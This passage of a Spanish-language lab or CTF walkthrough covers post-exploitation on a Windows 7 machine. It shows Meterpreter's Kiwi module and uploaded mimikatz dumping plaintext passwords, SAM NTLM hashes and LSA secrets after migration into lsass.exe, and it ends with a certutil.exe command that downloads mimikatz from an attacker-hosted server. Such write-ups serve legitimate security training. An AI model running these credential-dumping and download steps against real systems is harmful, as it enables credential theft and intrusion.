+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain     Password
+</span></span><span style="display:flex;"><span>--------       ------     --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator  haris-PC   ejfnIWWDojfWEKM
+</span></span><span style="display:flex;"><span>HARIS-PC$      WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kerberos credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username       Domain     Password
+</span></span><span style="display:flex;"><span>--------       ------     --------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Administrator  haris-PC   <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>haris-pc$      WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>De esta forma, obtuvimos las credenciales del <strong>usuario administrador</strong>, incluso la obtuvimos en texto claro.</p>
+<ul>
+<li><strong>Dumpeando los Hashes de SAM</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; lsa_dump_sam
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping SAM
+</span></span><span style="display:flex;"><span>Domain : HARIS-PC
+</span></span><span style="display:flex;"><span>SysKey : a749692f1dc76b46d7141ef778aa6bef
+</span></span><span style="display:flex;"><span>Local SID : S-1-5-21-319597671-3711062392-2889596693
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SAMKey : a226d4d47dab3eb7a306c8b85ec359cb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f4 <span style="color:#f92672">(</span>500<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Administrator
+</span></span><span style="display:flex;"><span>  Hash NTLM: cdf51b162460b7d5bc898f493751a0cc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f5 <span style="color:#f92672">(</span>501<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Guest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000003e8 <span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : haris
+</span></span><span style="display:flex;"><span>  Hash NTLM: 8002bc89de91f6b52d518bde69202dc6
+</span></span></code></pre></div><p>Obtenemos el hash del <strong>administrador</strong> y del <strong>usuario harris</strong>.</p>
+<ul>
+<li><strong>Dumpeando los LSA SECRETS</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; lsa_dump_secrets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA secrets
+</span></span><span style="display:flex;"><span>Domain : HARIS-PC
+</span></span><span style="display:flex;"><span>SysKey : a749692f1dc76b46d7141ef778aa6bef
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local name : haris-PC <span style="color:#f92672">(</span> S-1-5-21-319597671-3711062392-2889596693 <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Domain name : WORKGROUP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Policy subsystem is : 1.11
+</span></span><span style="display:flex;"><span>LSA Key<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> : 1, default <span style="color:#f92672">{</span>060be82b-0750-887a-808d-0774087457db<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>00<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>060be82b-0750-887a-808d-0774087457db<span style="color:#f92672">}</span> d28ec83ef05184b93100beaa4d64a6a1a420b8a7a144c943fe57f60fbaa6425d
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DefaultPassword
+</span></span><span style="display:flex;"><span>old/text: kERjCoEmxdlSD
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DPAPI_SYSTEM
+</span></span><span style="display:flex;"><span>cur/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 0a f3 a4 c2 1c ac <span style="color:#ae81ff">07</span> 2f <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">61</span> b5 <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">95</span> 2d f3 0d 0f c8 4e 4e a5 c8 <span style="color:#ae81ff">92</span> f6 <span style="color:#ae81ff">74</span> a6 ea b6 fb <span style="color:#ae81ff">62</span> 3e a7 <span style="color:#ae81ff">93</span> cf cf 6f 
+</span></span><span style="display:flex;"><span>    full: 0af3a4c21cac072f830761b502678978952df30d0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f
+</span></span><span style="display:flex;"><span>    m/u : 0af3a4c21cac072f830761b502678978952df30d / 0fc84e4ea5c892f674a6eab6fb623ea793cfcf6f
+</span></span><span style="display:flex;"><span>old/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> c9 <span style="color:#ae81ff">22</span> d6 0b <span style="color:#ae81ff">83</span> 9e dd <span style="color:#ae81ff">98</span> a7 ad 7a 5a c5 ff 4e bb 8a d2 6f <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">61</span> be bf d4 bc <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">70</span> fd df <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">12</span> a8 c5 e5 2d <span style="color:#ae81ff">98</span> 6c <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">71</span> 
+</span></span><span style="display:flex;"><span>    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
+</span></span><span style="display:flex;"><span>    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
+</span></span></code></pre></div><p>Con esto, terminamos de usar el <strong>módulo Kiwi</strong>, ahora podemos cargar el programa <strong>mimikatz.exe</strong> para poder obtener lo mismo que hizo <strong>Kiwi</strong>.</p>
+<h3 id="mimik2">Usando Mimikatz en Máquina Víctima</h3>
+<p>Para que el <strong>mimikatz.exe</strong> funcione debe ser ejecutado como un <strong>administrador</strong>, para identificarnos como <strong>administrador</strong> desde el <strong>Metasploit Framework</strong>, necesitamos migrar a un proceso que es ejecutado unicamente como <strong>administrador</strong>, el más común de estos procesos es el <strong>lsass.exe</strong>. Para migrar a este proceso, necesitamos su <strong>PID</strong> y que tengamos permisos suficientes para esta migración, hagamos esto por pasos:</p>
+<ul>
+<li>Viendo procesos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ps
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span>Process List
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>
+</span></span><span style="display:flex;"><span>-
+</span></span><span style="display:flex;"><span> PID   PPID  Name               Arch  Session  User                          Path
+</span></span><span style="display:flex;"><span> ---   ----  ----               ----  -------  ----                          ----
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System             x64   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">236</span>   <span style="color:#ae81ff">4</span>     smss.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           <span style="color:#ae81ff">\S</span>ystemRoot<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">268</span>   <span style="color:#ae81ff">428</span>   spoolsv.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">320</span>   <span style="color:#ae81ff">312</span>   csrss.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">328</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">364</span>   <span style="color:#ae81ff">312</span>   wininit.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">392</span>   <span style="color:#ae81ff">372</span>   csrss.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">428</span>   <span style="color:#ae81ff">364</span>   services.exe       x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">464</span>   <span style="color:#ae81ff">372</span>   winlogon.exe       x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">476</span>   <span style="color:#ae81ff">364</span>   lsass.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">484</span>   <span style="color:#ae81ff">364</span>   lsm.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">592</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">728</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">756</span>   <span style="color:#ae81ff">464</span>   LogonUI.exe        x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">816</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">864</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">900</span>   <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1036</span>  <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1128</span>  <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1268</span>  <span style="color:#ae81ff">428</span>   VGAuthService.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\V</span>Mware<span style="color:#ae81ff">\V</span>Mware Tools<span style="color:#ae81ff">\V</span>Mware VGAuth<span style="color:#ae81ff">\V</span>GAuthService.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1316</span>  <span style="color:#ae81ff">428</span>   vmtoolsd.exe       x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\V</span>Mware<span style="color:#ae81ff">\V</span>Mware Tools<span style="color:#ae81ff">\v</span>mtoolsd.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1596</span>  <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1792</span>  <span style="color:#ae81ff">592</span>   WmiPrvSE.exe
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1972</span>  <span style="color:#ae81ff">428</span>   msdtc.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2460</span>  <span style="color:#ae81ff">428</span>   sppsvc.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2508</span>  <span style="color:#ae81ff">428</span>   svchost.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2584</span>  <span style="color:#ae81ff">428</span>   SearchIndexer.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><ul>
+<li>Obteniendo <strong>PID</strong> del proceso <strong>lsass.exe</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; pgrep lsass
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">476</span>
+</span></span></code></pre></div><ul>
+<li>Migrando a este proceso:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; migrate <span style="color:#ae81ff">476</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">268</span> to 476...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
+</span></span></code></pre></div><p>Una vez que ya hemos migrado de proceso, vamos a cargar el programa de <strong>mimikatz.exe</strong>, este programa esta por default en <strong>Kali</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -&gt; mimikatz.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploaded 1.29 MiB of 1.29 MiB <span style="color:#f92672">(</span>100.0%<span style="color:#f92672">)</span>: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -&gt; mimikatz.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Completed  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -&gt; mimikatz.exe
+</span></span><span style="display:flex;"><span>meterpreter &gt; dir
+</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode              Size     Type  Last modified              Name
+</span></span><span style="display:flex;"><span>----              ----     ----  -------------              ----
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2017-07-21 01:56:27 -0500  $Recycle.Bin
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2022-02-18 09:11:31 -0600  Config.Msi
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2009-07-14 00:08:56 -0500  Documents and Settings
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2009-07-13 22:20:08 -0500  PerfLogs
+</span></span><span style="display:flex;"><span>040555/r-xr-xr-x  <span style="color:#ae81ff">4096</span>     dir   2022-02-18 09:02:50 -0600  Program Files
+</span></span><span style="display:flex;"><span>040555/r-xr-xr-x  <span style="color:#ae81ff">4096</span>     dir   2017-07-14 11:58:41 -0500  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">4096</span>     dir   2017-12-23 20:23:01 -0600  ProgramData
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2022-02-18 08:09:14 -0600  Recovery
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">0</span>        dir   2017-07-14 08:48:44 -0500  Share
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">4096</span>     dir   2024-03-11 21:41:55 -0600  System Volume Information
+</span></span><span style="display:flex;"><span>040555/r-xr-xr-x  <span style="color:#ae81ff">4096</span>     dir   2017-07-21 01:56:23 -0500  Users
+</span></span><span style="display:flex;"><span>040777/rwxrwxrwx  <span style="color:#ae81ff">16384</span>    dir   2024-03-11 21:21:40 -0600  Windows
+</span></span><span style="display:flex;"><span>100777/rwxrwxrwx  <span style="color:#ae81ff">1355264</span>  fil   2024-03-11 22:45:55 -0600  mimikatz.exe
+</span></span><span style="display:flex;"><span>000000/---------  <span style="color:#ae81ff">0</span>        fif   1969-12-31 18:00:00 -0600  pagefile.sys
+</span></span></code></pre></div><p>Y nos metemos con una shell a la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">1384</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">3</span> created.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>
+</span></span></code></pre></div><p>Ahora, ejecutamos el programa <strong>mimikatz.exe</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;.\mimikatz.exe</span>
+</span></span><span style="display:flex;"><span>.\mimikatz.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+</span></span><span style="display:flex;"><span> .## <span style="color:#ae81ff">^ </span>##.  <span style="color:#e6db74">&#34;A La Vie, A L&#39;Amour&#34;</span> - (oe.eo)
+</span></span><span style="display:flex;"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span><span style="display:flex;"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span><span style="display:flex;"><span> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span><span style="display:flex;"><span>  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz #
+</span></span></code></pre></div><p>Revisamos que tengamos los privilegios necesarios para dumpear los hashes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>mimikatz # privilege::debug
+</span></span><span style="display:flex;"><span>Privilege &#39;20&#39; OK
+</span></span></code></pre></div><p>Y obtenemos las credenciales:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>mimikatz # sekurlsa::logonpasswords
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Authentication Id : 0 ; 542841 (00000000:00084879)
+</span></span><span style="display:flex;"><span>Session           : Interactive from 0
+</span></span><span style="display:flex;"><span>User Name         : Administrator
+</span></span><span style="display:flex;"><span>Domain            : haris-PC
+</span></span><span style="display:flex;"><span>Logon Server      : HARIS-PC
+</span></span><span style="display:flex;"><span>Logon Time        : 12/03/2024 03:21:36
+</span></span><span style="display:flex;"><span>SID               : S-1-5-21-319597671-3711062392-2889596693-500
+</span></span><span style="display:flex;"><span>        msv :
+</span></span><span style="display:flex;"><span>         [00010000] CredentialKeys
+</span></span><span style="display:flex;"><span>         * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+</span></span><span style="display:flex;"><span>         * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+</span></span><span style="display:flex;"><span>         [00000003] Primary
+</span></span><span style="display:flex;"><span>         * Username : Administrator
+</span></span><span style="display:flex;"><span>         * Domain   : haris-PC
+</span></span><span style="display:flex;"><span>         * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+</span></span><span style="display:flex;"><span>         * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+</span></span><span style="display:flex;"><span>        tspkg :
+</span></span><span style="display:flex;"><span>        wdigest :
+</span></span><span style="display:flex;"><span>         * Username : Administrator
+</span></span><span style="display:flex;"><span>         * Domain   : haris-PC
+</span></span><span style="display:flex;"><span>         * Password : ejfnIWWDojfWEKM
+</span></span><span style="display:flex;"><span>        kerberos :
+</span></span><span style="display:flex;"><span>         * Username : Administrator
+</span></span><span style="display:flex;"><span>         * Domain   : haris-PC
+</span></span><span style="display:flex;"><span>         * Password : (null)
+</span></span><span style="display:flex;"><span>        ssp :
+</span></span><span style="display:flex;"><span>        credman :
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Authentication Id : 0 ; 997 (00000000:000003e5)
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>También obtenemos los hashes del <strong>SAM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>mimikatz # lsadump::sam
+</span></span><span style="display:flex;"><span>Domain : HARIS-PC
+</span></span><span style="display:flex;"><span>SysKey : a749692f1dc76b46d7141ef778aa6bef
+</span></span><span style="display:flex;"><span>Local SID : S-1-5-21-319597671-3711062392-2889596693
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SAMKey : a226d4d47dab3eb7a306c8b85ec359cb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f4 (500)
+</span></span><span style="display:flex;"><span>User : Administrator
+</span></span><span style="display:flex;"><span>  Hash NTLM: cdf51b162460b7d5bc898f493751a0cc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f5 (501)
+</span></span><span style="display:flex;"><span>User : Guest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000003e8 (1000)
+</span></span><span style="display:flex;"><span>User : haris
+</span></span><span style="display:flex;"><span>  Hash NTLM: 8002bc89de91f6b52d518bde69202dc6
+</span></span></code></pre></div><h3 id="mimik3">Cargando Mimikatz desde Nuestra Máquina</h3>
+<p>Por último, vamos a cargar <strong>mimikatz</strong> desde nuestra máquina, utilizando <strong>certutil.exe</strong></p>
+<p>Primero, vamos a abrir un servidor en <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>Ahora con <strong>certutil.exe</strong>, descargamos <strong>mimikatz</strong> en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe</span>
+</span></span><span style="display:flex;"><span>certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  000000  ...
+</span></span><span style="display:flex;"><span>  14ae00
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><p>Revisamos que se haya descargado correctamente:</p>
